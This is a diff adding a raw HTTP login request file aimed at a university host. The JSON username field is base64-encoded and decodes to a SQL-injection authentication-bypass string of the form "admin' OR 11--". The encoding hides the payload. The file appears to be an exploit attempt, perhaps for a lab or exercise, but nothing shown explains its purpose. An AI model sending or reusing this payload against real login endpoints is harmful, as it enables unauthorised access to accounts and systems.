@@ -1,0 +1,10 @@
+POST /login HTTP/1.1
+Host: gorila.dsa.linti.unlp.edu.ar
+Content-Type: application/json
+Content-Length: 100
+
+{
+  "username": "YWRtaW4nIE9SIDExLS0=",
+  "password": "test"
+}
+
